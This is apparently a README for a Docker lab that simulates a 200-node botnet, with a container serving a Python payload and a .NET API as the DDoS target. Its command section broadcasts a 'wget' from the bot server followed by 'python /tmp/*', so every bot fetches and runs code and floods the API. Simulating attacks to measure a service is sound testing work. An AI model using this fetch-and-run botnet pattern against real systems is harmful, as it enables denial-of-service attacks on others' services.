# Run Botnet Simulation

To simulate a botnet network, Docker was used to create `200 containers` simulating `200 computers infected with a payload that connects their device to a network`. In order to apply a utilisation after connecting these devices, a python payload will be injected into each victim to simulate a `DDOS attack on a server`.

## Setup Network

To configure the machine that will serve as a server for the botnets, a `container was created that also exports a simple http server`, so that connected clients can download the payload that will be used to force the bots to make http requests against a given server.

```bash
    task create-server
```

In this way, it will create an internal network in docker for simulating botnets

## Setup Target Api Service

For this simulation, we will use a web service (API) developed in .NET 7, which is configured with performance monitoring tools. In this way, it will be possible to analyse and monitor the effectiveness of the simulation's performance more precisely.

```bash
    task compose
```

### Create an Botnet

After configuring both containers, we'll enter the newly created server (botnet server).

```bash
    docker ps
```

```

```

Next, the connection to the container is made and the payload that will be used to infect the containers for the simulation is prepared.

| Create an Botnet Payload

```bash
    python client.py server 2000 --name botnet.py
```

In this way, an instance of the botnet server is created, and the 200 botnets are created using the following command.

```bash
    task start
```

All the bots are connected, all that's needed now is to `inject the payload and force it to run`

```
    > broadcast wget http://server:3000/
    > broadcast python /tmp/*
```

This is how the attack begins: all the botnets start making multiple HTTP requests, with the aim of `restricting the execution` of the web service.